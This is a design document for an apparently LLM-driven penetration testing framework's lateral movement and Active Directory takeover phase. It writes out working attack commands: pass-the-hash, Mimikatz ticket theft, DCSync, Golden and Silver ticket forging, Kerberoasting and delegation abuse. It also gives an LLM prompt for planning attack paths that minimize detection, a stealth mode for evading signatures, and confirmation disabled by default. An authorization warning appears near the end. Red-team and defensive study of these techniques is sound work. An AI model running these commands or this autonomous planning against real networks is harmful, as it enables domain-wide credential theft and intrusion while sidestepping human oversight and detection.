# Phase 5 Implementation: Lateral Movement & Domain Dominance

## Overview

Phase 5 represents the **Lateral Movement and Domain Dominance** stage of the penetration test. After successful post-exploitation in Phase 4, this phase focuses on:

1. **Lateral Movement**: Spreading across the network to additional hosts
2. **Active Directory Attacks**: Exploiting AD infrastructure
3. **Domain Dominance**: Achieving Domain Admin privileges
4. **Network Topology Mapping**: Understanding network architecture
5. **Crown Jewels Targeting**: Locating and compromising high-value assets

## Architecture

### Core Components

```
phase5_orchestrator.py
├── Phase5Orchestrator (Main Orchestrator)
├── NetworkHost (Data Model)
├── LateralMovementAttempt (Data Model)
├── AttackPath (Data Model)
├── Phase5Progress (Progress Tracking)
└── NetworkX Graph (Network Topology)
```

### Data Models

#### NetworkHost
```python
@dataclass
class NetworkHost:
    ip: str
    hostname: Optional[str]
    os_type: str
    domain: Optional[str]
    role: str  # workstation, server, domain_controller
    compromised: bool
    access_method: Optional[str]
    credentials_used: Optional[str]
    services: List[str]
    ad_attributes: Dict[str, Any]
```

#### LateralMovementAttempt
```python
@dataclass
class LateralMovementAttempt:
    from_host: str
    to_host: str
    technique: str  # pass_the_hash, pass_the_ticket, ssh, rdp, winrm, psexec
    credential_used: Optional[str]
    success: bool
    method_details: Dict[str, Any]
    timestamp: str
```

#### AttackPath
```python
@dataclass
class AttackPath:
    path_id: str
    start_host: str
    end_host: str
    hops: List[str]
    techniques_used: List[str]
    total_cost: float  # Lower is better
    feasibility: str  # high, medium, low
    description: str
```

## Workflow

### 1. Load Phase 4 Results

Phase 5 begins by loading compromised hosts and credentials from Phase 4:

```python
# Load from Phase 4 results
phase4_results = self._load_phase4_results()
compromised_hosts = phase4_results.get('compromised_hosts', [])
credentials_database = phase4_results.get('credentials_database', {})
```

### 2. Network Topology Discovery

Build a NetworkX graph representing the network:

```python
self.network_graph = nx.DiGraph()

# Add nodes (hosts)
self.network_graph.add_node(host_ip, **host_attributes)

# Add edges (connectivity)
self.network_graph.add_edge(source_ip, dest_ip, weight=cost)
```

### 3. LLM-Driven Lateral Movement Planning

The LLM analyzes the network and creates an attack path strategy:

```python
plan = await self.orchestrator.create_lateral_movement_plan(
    compromised_hosts=compromised_hosts,
    credentials=credentials,
    network_topology=network_topology,
    target_roles=['domain_controller', 'file_server', 'database_server']
)
```

**LLM Prompt Structure**:
```
You are a penetration testing expert specializing in Active Directory environments.
Create a lateral movement plan.

Compromised Hosts:
{compromised_hosts}

Available Credentials:
{credentials}

Network Topology:
{network_topology}

Objectives:
1. Identify attack paths to Domain Controllers
2. Select optimal lateral movement techniques
3. Prioritize high-value targets
4. Minimize detection risk

Output JSON format:
{
  "attack_paths": [
    {
      "target": "dc01.corp.local",
      "path": ["web01", "app01", "dc01"],
      "techniques": ["pass_the_hash", "psexec"],
      "priority": 1-10
    }
  ],
  "credential_spray_targets": [...],
  "ad_attack_sequence": [...]
}
```

### 4. Lateral Movement Techniques

#### 1. Pass-the-Hash (PtH)

**Description**: Use NTLM hash without cracking password

```python
# Example using impacket
python psexec.py -hashes :NTLMHASH administrator@target.ip
```

**Use Cases**:
- Windows-to-Windows lateral movement
- Works even with NTLM disabled on some configurations
- Effective against local administrator accounts

#### 2. Pass-the-Ticket (PtT)

**Description**: Inject Kerberos tickets for authentication

```python
# Example using Rubeus/Mimikatz
# Extract ticket
mimikatz.exe "sekurlsa::tickets /export"

# Inject ticket
mimikatz.exe "kerberos::ptt [ticket.kirbi]"
```

**Use Cases**:
- Kerberos-enabled environments
- Domain user lateral movement
- Golden/Silver ticket attacks

#### 3. SSH Lateral Movement

**Description**: Use SSH keys or passwords for Linux-to-Linux movement

```bash
# Using harvested keys
ssh -i stolen_key.pem user@target_host

# Using harvested passwords
sshpass -p 'password' ssh user@target_host
```

**Use Cases**:
- Linux environments
- SSH key-based authentication
- Jump hosts and bastion servers

#### 4. RDP Lateral Movement

**Description**: Remote Desktop Protocol for Windows access

```python
# Using xfreerdp
xfreerdp /u:administrator /p:password /v:target.ip /cert-ignore

# Using restricted admin mode (PtH)
xfreerdp /u:administrator /pth:NTLMHASH /v:target.ip
```

**Use Cases**:
- Windows servers with RDP enabled
- Interactive GUI access needed
- Restricted Admin mode for PtH

#### 5. WinRM Lateral Movement

**Description**: Windows Remote Management for PowerShell remoting

```powershell
# Enter remote session
Enter-PSSession -ComputerName target.hostname -Credential $cred

# Execute command
Invoke-Command -ComputerName target.hostname -ScriptBlock { whoami }
```

**Use Cases**:
- PowerShell-enabled environments
- Remote command execution
- Windows Server management

#### 6. PSExec Lateral Movement

**Description**: Execute processes remotely via SMB

```python
# Using impacket
python psexec.py domain/user:password@target.ip

# Using PsExec.exe
psexec.exe \\target.ip -u user -p password cmd.exe
```

**Use Cases**:
- SMB/445 access
- Remote process execution
- Administrative access required

#### 7. WMI Lateral Movement

**Description**: Windows Management Instrumentation for stealthy execution

```powershell
# Create WMI process
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe" -ComputerName target.hostname
```

**Use Cases**:
- Stealthy lateral movement
- Process creation without binaries
- Fileless attacks

### 5. Active Directory Attacks

#### 1. Kerberoasting

**Description**: Extract and crack service account passwords

```python
# Request service tickets
GetUserSPNs.py domain/user:password -dc-ip dc.ip -request

# Crack offline with Hashcat
hashcat -m 13100 spn_hashes.txt wordlist.txt
```

**Detection**: Medium
**Impact**: Service account compromise
**Requirements**: Domain user credentials

#### 2. AS-REP Roasting

**Description**: Attack accounts without Kerberos pre-authentication

```python
# Find vulnerable accounts
GetNPUsers.py domain/ -dc-ip dc.ip -no-pass -usersfile users.txt

# Crack AS-REP hashes
hashcat -m 18200 asrep_hashes.txt wordlist.txt
```

**Detection**: Low
**Impact**: Account compromise
**Requirements**: User enumeration

#### 3. DCSync

**Description**: Impersonate Domain Controller to request password hashes

```python
# Using Mimikatz
lsadump::dcsync /domain:corp.local /user:Administrator

# Using impacket
secretsdump.py domain/user:password@dc.ip -just-dc-ntlm
```

**Detection**: High (if monitored)
**Impact**: Domain-wide compromise
**Requirements**: Replication privileges (Domain Admin or equivalent)

#### 4. Golden Ticket

**Description**: Forge Kerberos TGT with KRBTGT hash

```python
# Create Golden Ticket
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH /ptt

# Access any resource
psexec.exe \\dc01.corp.local cmd.exe
```

**Detection**: Very Low
**Impact**: Full domain control
**Requirements**: KRBTGT account hash
**Persistence**: Long-term (until KRBTGT password changed twice)

#### 5. Silver Ticket

**Description**: Forge service ticket for specific service

```python
# Create Silver Ticket for CIFS service
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /target:fileserver.corp.local /service:cifs /rc4:SERVICE_HASH /ptt

# Access file share
dir \\fileserver.corp.local\c$
```

**Detection**: Low
**Impact**: Service-specific access
**Requirements**: Service account hash

#### 6. Unconstrained Delegation

**Description**: Exploit servers with unconstrained delegation

```python
# Find servers with unconstrained delegation
Get-ADComputer -Filter {TrustedForDelegation -eq $true}

# Monitor for TGTs
Rubeus.exe monitor /interval:5

# Compromise server and extract TGTs
Rubeus.exe triage
```

**Detection**: Medium
**Impact**: TGT harvesting
**Requirements**: Compromise of delegation server

#### 7. Constrained Delegation

**Description**: Abuse constrained delegation for service impersonation

```python
# Find accounts with constrained delegation
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"}

# Request service ticket
getST.py -spn service/target.hostname domain/user:password -impersonate Administrator
```

**Detection**: Medium
**Impact**: Service impersonation
**Requirements**: Account with delegation rights

### 6. BloodHound Integration

#### Data Collection

```bash
# SharpHound data collection
SharpHound.exe -c All -d corp.local --zipfilename corp_bloodhound.zip

# Import to BloodHound
# Analyze attack paths in Neo4j graph database
```

#### Attack Path Analysis

```cypher
# Find shortest path to Domain Admins
MATCH (u:User {owned:true}), (g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}),
p=shortestPath((u)-[*1..]->(g))
RETURN p

# Find Kerberoastable users
MATCH (u:User {hasspn:true}) RETURN u

# Find computers with unconstrained delegation
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c
```

#### Graph Topology in NetworkX

```python
# Build attack graph
def build_attack_graph(bloodhound_data):
    G = nx.DiGraph()
    
    # Add nodes
    for user in bloodhound_data['users']:
        G.add_node(user['name'], type='user', **user)
    
    # Add edges (relationships)
    for relation in bloodhound_data['relationships']:
        G.add_edge(
            relation['source'],
            relation['target'],
            type=relation['type'],
            weight=relation['cost']
        )
    
    return G

# Find attack paths
def find_attack_paths(G, start, target='Domain Admins'):
    try:
        paths = list(nx.all_shortest_paths(G, start, target))
        return paths
    except nx.NetworkXNoPath:
        return []
```

### 7. Crown Jewels Targeting

#### High-Value Targets

1. **Domain Controllers**
   - Primary objective for domain dominance
   - Full AD database access
   - KRBTGT hash extraction

2. **File Servers**
   - Sensitive document repositories
   - Database backups
   - Source code

3. **Database Servers**
   - Customer data
   - Financial records
   - Intellectual property

4. **Exchange Servers**
   - Email archives
   - Calendar information
   - Contacts

5. **Backup Servers**
   - System backups
   - Credential stores
   - Configuration files

## Configuration

### Phase 5 Configuration Structure

```python
phase5_config = {
    'lateral_movement': {
        'enabled': True,
        'max_hops': 5,  # Maximum lateral movement jumps
        'techniques': [
            'pass_the_hash',
            'pass_the_ticket',
            'ssh',
            'rdp',
            'winrm',
            'psexec',
            'wmi'
        ],
        'stealth_mode': True,
        'timeout': 300  # seconds per attempt
    },
    'active_directory': {
        'enabled': True,
        'attacks': [
            'kerberoasting',
            'asrep_roasting',
            'dcsync',
            'golden_ticket',
            'silver_ticket',
            'unconstrained_delegation'
        ],
        'bloodhound_collection': True
    },
    'domain_dominance': {
        'target_dc': True,
        'extract_ntds': True,  # Extract NTDS.dit database
        'krbtgt_hash': True,   # Obtain KRBTGT for Golden Ticket
        'bloodhound_analysis': True
    },
    'crown_jewels': {
        'target_types': [
            'domain_controller',
            'file_server',
            'database_server',
            'exchange_server',
            'backup_server'
        ],
        'prioritize_dc': True
    },
    'safe_mode': True,
    'require_confirmation': False
}
```

## Safety Features

### 1. Safe Mode

When `safe_mode: True`:
- No destructive AD modifications
- Read-only DCSync operations
- No Golden Ticket creation in production
- Verbose logging of all lateral movement

### 2. Stealth Mode

When `stealth_mode: True`:
- Randomized sleep intervals between attempts
- Minimal network noise
- Use existing legitimate connections
- Avoid detection signatures

### 3. Hop Limiting

```python
'max_hops': 5  # Prevent excessive lateral movement
```

Prevents:
- Uncontrolled network spreading
- Excessive noise generation
- Resource exhaustion

## Integration with Other Phases

### Input (from Phase 4)

```python
# Expected Phase 4 output structure
{
    'compromised_hosts': [
        {
            'host': '192.168.1.100',
            'os_type': 'linux',
            'fully_compromised': True,
            'credentials': [...]
        }
    ],
    'credentials_database': {
        'passwords': [
            {'username': 'admin', 'password': 'P@ssw0rd123', 'domain': 'corp.local'}
        ],
        'hashes': [
            {'username': 'sqlsvc', 'ntlm': 'hash...', 'domain': 'corp.local'}
        ],
        'tokens': [...],
        'keys': [...]
    }
}
```

### Output (Final Results)

```python
# Phase 5 final output
{
    'network_topology': {
        'total_hosts_discovered': 150,
        'hosts_compromised': 45,
        'domain_controllers': ['dc01.corp.local', 'dc02.corp.local'],
        'high_value_targets': [...]
    },
    'lateral_movements': [
        {
            'from': '192.168.1.100',
            'to': '10.0.0.50',
            'technique': 'pass_the_hash',
            'success': True
        }
    ],
    'active_directory': {
        'domain': 'corp.local',
        'domain_admin_achieved': True,
        'domain_controllers_compromised': 2,
        'krbtgt_hash': 'hash...',
        'ntds_dit_extracted': True,
        'total_accounts_compromised': 234
    },
    'attack_paths': [
        {
            'path': ['web01', 'app01', 'dc01'],
            'techniques': ['ssh', 'pass_the_hash'],
            'cost': 2.5
        }
    ],
    'statistics': {
        'successful_lateral_movements': 38,
        'failed_attempts': 12,
        'domain_admin_achieved': True,
        'crown_jewels_compromised': 5
    }
}
```

## Usage Examples

### CLI Usage

```bash
# Run complete Phase 1→2→3→4→5 workflow
python main.py --phase12345 --target corp.local

# Phase 5 requires Phase 4 results
python main.py --phase 5 --target 192.168.1.0/24
# Warning: Phase 5 requires Phase 4 results. Use --phase12345 for complete workflow.
```

### Programmatic Usage

```python
from core.phase5_orchestrator import Phase5Orchestrator
from core.llm_orchestrator import LLMOrchestrator, OpenAIProvider

# Initialize
provider = OpenAIProvider(api_key, model="gpt-4")
orchestrator = LLMOrchestrator(provider)

phase5_config = {
    'lateral_movement': {
        'enabled': True,
        'max_hops': 5,
        'stealth_mode': True
    },
    'active_directory': {
        'enabled': True,
        'bloodhound_collection': True
    },
    'domain_dominance': {
        'target_dc': True,
        'krbtgt_hash': True
    }
}

phase5 = Phase5Orchestrator(orchestrator, phase5_config)

# Execute
results = await phase5.execute(target="corp.local")

# Access results
print(f"Lateral Movements: {results['statistics']['successful_lateral_movements']}")
print(f"Domain Admin: {results['statistics']['domain_admin_achieved']}")
print(f"DCs Compromised: {results['statistics']['domain_controllers_compromised']}")
```

## API Reference

### Phase5Orchestrator

#### Methods

##### `execute(target: str, phase4_results: Optional[Dict] = None) -> Dict[str, Any]`

Execute Phase 5 lateral movement and domain dominance.

**Parameters**:
- `target` (str): Target domain or network range
- `phase4_results` (Dict, optional): Phase 4 results (auto-loaded if not provided)

**Returns**: Phase 5 results dictionary

##### `create_lateral_movement_plan(compromised_hosts: List, credentials: Dict, network_topology: Dict) -> Dict[str, Any]`

Generate LLM-driven lateral movement plan.

**Returns**: Plan with attack paths, techniques, and target priorities

##### `build_network_graph(hosts: List[NetworkHost]) -> nx.DiGraph`

Build NetworkX graph of network topology.

**Returns**: NetworkX directed graph

##### `find_attack_paths(start_host: str, target_role: str = 'domain_controller') -> List[AttackPath]`

Find optimal attack paths using graph algorithms.

**Returns**: List of attack paths ordered by feasibility

### Data Structures

#### Statistics Output

```python
{
    'total_hosts_discovered': 150,
    'successful_lateral_movements': 38,
    'failed_lateral_movements': 12,
    'lateral_movement_success_rate': 0.76,
    'unique_techniques_used': 5,
    'technique_breakdown': {
        'pass_the_hash': 15,
        'pass_the_ticket': 8,
        'ssh': 7,
        'rdp': 5,
        'psexec': 3
    },
    'domain_admin_achieved': True,
    'domain_controllers_compromised': 2,
    'crown_jewels_compromised': 5,
    'attack_paths_executed': 3,
    'average_hops_to_dc': 2.5
}
```

## Troubleshooting

### Common Issues

#### 1. Lateral Movement Blocked

**Symptoms**: All lateral movement attempts fail

**Solutions**:
- Verify credentials are valid
- Check firewall rules (SMB/445, WinRM/5985, RDP/3389)
- Ensure target services are running
- Try alternative techniques
- Review network segmentation

#### 2. Kerberos Authentication Fails

**Symptoms**: Pass-the-Ticket fails, Golden Ticket invalid

**Solutions**:
- Verify domain SID correctness
- Check time synchronization (max 5 min skew)
- Ensure KRBTGT hash is valid
- Validate domain name format

#### 3. BloodHound Data Collection Fails

**Symptoms**: SharpHound returns no data

**Solutions**:
- Verify domain credentials
- Check DC connectivity
- Ensure LDAP/389 is accessible
- Try alternative collection methods (remote vs local)

#### 4. DCSync Detected

**Symptoms**: DCSync triggers alerts, access denied

**Solutions**:
- Verify replication privileges
- Check SIEM/EDR alerts
- Use alternative credential dumping (Volume Shadow Copy)
- Reduce frequency of replication requests

## Best Practices

### 1. Lateral Movement Strategy

- **Start stealthy**: Use existing legitimate connections first
- **Escalate gradually**: Don't jump to Domain Admin immediately
- **Multiple paths**: Have backup routes to critical assets
- **Document paths**: Record successful lateral movement chains

### 2. Active Directory Attacks

- **Kerberoasting first**: Low-detection, high-value
- **DCSync last**: High-detection, only when necessary
- **Monitor tickets**: Kerberos ticket lifetimes and renewal
- **Golden Ticket caution**: Use sparingly, extreme persistence

### 3. Network Mapping

- **BloodHound essential**: Graph-based attack path analysis
- **Validate topology**: Verify network graph accuracy
- **Update regularly**: Network changes during assessment
- **Identify chokepoints**: Critical systems for network dominance

### 4. LLM Optimization

- **Rich context**: Provide detailed network topology
- **Domain-specific prompts**: AD-focused planning
- **Historical data**: Learn from previous attempts
- **Fallback strategies**: Multiple techniques per target

## Security Considerations

### Legal and Ethical

⚠️ **CRITICAL WARNING**: Phase 5 lateral movement is HIGHLY INVASIVE:

- Lateral movement spreads across production network
- Active Directory attacks can lock out accounts
- Domain compromise affects entire organization
- **REQUIRES explicit written authorization for ALL systems**
- **PRODUCTION DOMAIN COMPROMISE = SEVERE IMPACT**
- **COORDINATE with IT teams for damage control**

### Technical Risks

- **Account lockout**: Failed auth attempts trigger lockouts
- **Detection**: SIEM/EDR will detect lateral movement
- **Service disruption**: DCSync can impact DC performance
- **Golden Ticket**: Extreme persistence, hard to remediate
- **Network congestion**: Mass scanning can degrade performance

### Mitigation

- Always use `safe_mode: True` initially
- Limit `max_hops` to prevent runaway spreading
- Coordinate with Blue Team for detection testing
- Have rollback plans for all AD modifications
- Maintain incident response contact for emergencies

## Performance Tuning

### Parallel Execution

```python
# Concurrent lateral movement attempts
max_concurrent_movements = 5

# Thread pool for credential testing
credential_spray_workers = 10
```

### Graph Optimization

```python
# Limit graph size for performance
max_nodes = 1000

# Cache shortest paths
@lru_cache(maxsize=1000)
def get_shortest_path(start, end):
    return nx.shortest_path(G, start, end)
```

### Caching

```python
# Cache BloodHound queries
bloodhound_cache = {}

# Cache credential validation results
credential_cache = {}
```

## Future Enhancements

- [ ] Azure AD lateral movement (OAuth token abuse)
- [ ] Cloud identity federation attacks
- [ ] Certificate-based lateral movement (ADCS abuse)
- [ ] Machine learning for attack path optimization
- [ ] Automated Red Team adversary emulation
- [ ] Multi-forest/multi-domain lateral movement
- [ ] Real-time BloodHound graph updates
- [ ] Automated OPSEC scoring for techniques
- [ ] Integration with MITRE ATT&CK framework
- [ ] Deception detection (honeypots, canary tokens)

---

**Phase 5 Complete** ✅

**Domain Dominance Achieved** 🏆

This marks the completion of the **Core Penetration Testing Workflow**:

✅ Phase 1: Reconnaissance
✅ Phase 2: Vulnerability Assessment  
✅ Phase 3: Exploitation
✅ Phase 4: Post-Exploitation & Privilege Escalation
✅ Phase 5: Lateral Movement & Domain Dominance

**Remaining Phases (6-12)** are specialized modules for advanced scenarios.
